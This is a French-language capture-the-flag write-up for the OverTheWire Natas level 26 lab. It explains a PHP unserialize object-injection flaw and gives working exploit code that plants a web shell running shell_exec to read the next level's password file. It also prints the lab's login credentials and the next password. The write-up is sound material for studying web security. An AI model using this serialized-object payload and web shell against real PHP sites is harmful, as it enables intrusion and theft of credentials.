## Connexion (username=natas26 password=3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT)
```
http://natas26.natas.labs.overthewire.org/
```

## Recherche du mot de passe
Une classe Logger existe sur le serveur, et la méthode unserialize déséréalise le payload reçu à partir de ce qui est défini dans le cookie. Ça veut dire que je pourrais passer un objet sérialisé Logger.

En PHP, la méthode __construct() n'est jamais appelée automatiquement lors de l'utilisation de unserialize()
Tant mieux puisque ici le constructeur y met des valeurs pas intéressantes.

Une autre particularité de unserialize est qu'elle bypass les règles d'accessibilités des attributs (private public protected ... ca ne change rien tout est modifiable même sans setter).

Le destructeur écrit dans un fichier un message.
fwrite permet de mettre en deuxième paramètre une fonction qui retourne un string.
```php
function __destruct(){
    // write exit message
    $fd=fopen($this->logFile,"a+");
    fwrite($fd,$this->exitMsg);
    fclose($fd);
}
```

La désérialisation se fait ainsi:
```php
unserialize(base64_decode($_COOKIE["drawing"]));
```

Je n'ai qu'à changer le contenu du cookie drawing pour le résultat de cette commande:
```php
class Logger{
    private $logFile = "/var/www/natas/natas26/img/natas26_fa5at5nskqccnm4vujpjb51cga.php"; # changer pour son php sid
    private $exitMsg = "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
}
$logger = new Logger();
echo base64_encode(serialize(array($logger)));
```

Normalement si je vais visiter http://natas26.natas.labs.overthewire.org/img/natas26_fa5at5nskqccnm4vujpjb51cga.php

j'obtiens le prochain mot de passe

## Prochain mot de passe
```
mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV
```